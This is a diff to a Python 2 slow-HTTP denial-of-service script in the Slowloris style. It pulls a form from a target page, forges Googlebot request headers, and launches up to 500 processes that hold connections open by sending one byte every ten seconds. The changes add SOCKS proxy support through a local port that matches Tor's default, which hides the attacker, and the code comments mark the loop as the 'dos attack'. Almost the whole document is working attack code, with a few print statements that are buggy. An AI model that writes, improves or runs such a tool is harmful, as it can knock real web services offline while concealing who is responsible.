@@ -1,6 +1,8 @@
 #!/usr/bin/env python
 
 import requests
+import requesocks
+import socket
 import sys
 import re
 import random
@@ -10,12 +12,12 @@ from bs4 import BeautifulSoup
 from urlparse import urlparse
 from multiprocessing import Process
 
-
+MAX_WORKERS   = 500
+SLEEP_TIME    = 10
+PROXY_ADDRESS = '127.0.0.1'
+PROXY_PORT    = 9050
 DEFAULT_USER_AGENT   = '%s' %\
     'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)'
-
-MAX_WORKERS = 15
-SLEEP_TIME  = 10
 
 def form_to_dict(form):
     
@@ -38,9 +40,7 @@ def form_to_dict(form):
         })
     return form_dict
 
-def get_forms(url):
-
-    response = requests.get(url)
+def get_forms(response):
     
     soup = BeautifulSoup(response.text)
 
@@ -59,8 +59,8 @@ def print_forms(forms):
 
 
 
-def choose_form(url):
-    forms = get_forms(url)
+def choose_form(response):
+    forms = get_forms(response)
 
     return make_choice(print_forms,
                 'Please select a form from the list above.',
@@ -93,9 +93,7 @@ def make_choice(menu_function, prompt, choices, field):
             print 'That is not a valid choice.'
         print
 
-def craft_headers(path, host, user_agent_list, param, cookies):
-
-    user_agent = random.choice(user_agent_list)
+def craft_headers(path, host, user_agent, param, cookies):
 
     return '\n'.join([
 
@@ -120,18 +118,15 @@ def port_from_url(url):
     m = re.search(p,url)
     port = m.group('port')
     if port == '':
-        return '80'
-    return 
-
-def get_cookies(target):
-
-    response = requests.get(target)
-    return response.headers.get('set-cookie', '')
+        return 80
+    return int(port)
 
 def parse_args():
 
     return {
-        'target' : 'http://192.168.99.230',
+        'use_proxies' : False,
+        'proxies' : [{ 'address' : PROXY_ADDRESS, 'port' : PROXY_PORT }],
+        'target' : 'http://192.168.99.102/doku.php',
         'max_workers' : MAX_WORKERS,
         'user_agent_file' : '',
         'sleep_time' : SLEEP_TIME,
@@ -141,10 +136,22 @@ def configure():
 
     args = parse_args()
 
-    form = choose_form(args['target'])
+    if args['use_proxies']:
+        session = requesocks.session()
+        proxy = args['proxies'][0]
+        session.proxies = {
+                'http': 'socks4://%s:%d' % (proxy['address'],proxy['port']),
+                'https': 'socks4://%s:%d' % (proxy['address'],proxy['port']),
+        }
+    else:
+        session = requests.session()
+
+    response = requests.get(args['target'])
+
+    form = choose_form(response)
     form_field = choose_input(form)
 
-    cookies = get_cookies(args['target'])
+    cookies = response.headers.get('set-cookie', '')
 
     parsed_url = urlparse(args['target'])
 
@@ -170,20 +177,47 @@ def configure():
         'user_agents' : user_agents,
         'max_workers' : args['max_workers'],
         'sleep_time' : args['sleep_time'],
+        'use_proxies' : args['use_proxies'],
+        'proxies' : args['proxies'],
     }
 
-def launch_attack(configs, headers):
+def launch_attack(i, configs, headers):
 
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    sock.connect((configs['host'], configs['port']))
-    sock.send(headers)
-    while True:
-        sock.send("\x41")
-        time.sleep(configs['sleep_time'])
+    try:
+
+        print '[worker %d] Establishing connection'
+        # establish connection 
+        if configs['use_proxies']:
+
+            # select proxy
+            proxy = random.choice(configs['proxies'])
+            print '[worker %d] Using socks proxy %s:%d' % (proxy['address'], proxy['port'])
+
+            # connect through proxy
+            sock = socksocket()
+            sock.setproxy(PROXY_TYPE_SOCK4, proxy['address'], proxy['port'])
+
+        else:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.connect((configs['host'], configs['port']))
+
+        print '[worker %d] Successfully connected to %s' % (i, configs['target'])
+
+        # start dos attack
+        print '[worker %d] Beginning HTTP session... sending headers' % i
+        sock.send(headers)
+        while True:
+            print '[worker %d] Sending one byte to target.' % i
+            sock.send("A")
+            print '[worker %d] Sleeping for %d seconds' % (configs['sleep_time'], i)
+            time.sleep(configs['sleep_time'])
+    except KeyboardInterrupt:
+        pass
     sock.close()
 
 #def launch_attack(i, configs, headers):
 #
+
 #    while True:
 #        print "Worker #%d: sending \x41" % i
 #        time.sleep(configs['sleep_time'])
@@ -194,24 +228,25 @@ if __name__ == '__main__':
     configs = configure()
 
     workers = []
-    for i in xrange(configs['max_workers']):
-
-        headers = craft_headers(configs['path'],
-                            configs['host'],
-                            random.choice(configs['user_agents']),
-                            configs['param'],
-                            configs['cookies'])
-
-        p = Process(target=launch_attack, args=(i, configs, headers))
-        p.start()
-        workers.append(p)
     try:
+        for i in xrange(configs['max_workers']):
+
+            headers = craft_headers(configs['path'],
+                                configs['host'],
+                                random.choice(configs['user_agents']),
+                                configs['param'],
+                                configs['cookies'])
+
+            p = Process(target=launch_attack, args=(i, configs, headers))
+            p.start()
+            workers.append(p)
+
         for w in workers:
             w.join()
 
     except KeyboardInterrupt:
 
-        print '\nExiting on User Interrupt'
+        print '\n[!] Exiting on User Interrupt'
         for w in workers:
             w.terminate()
         for w in workers:
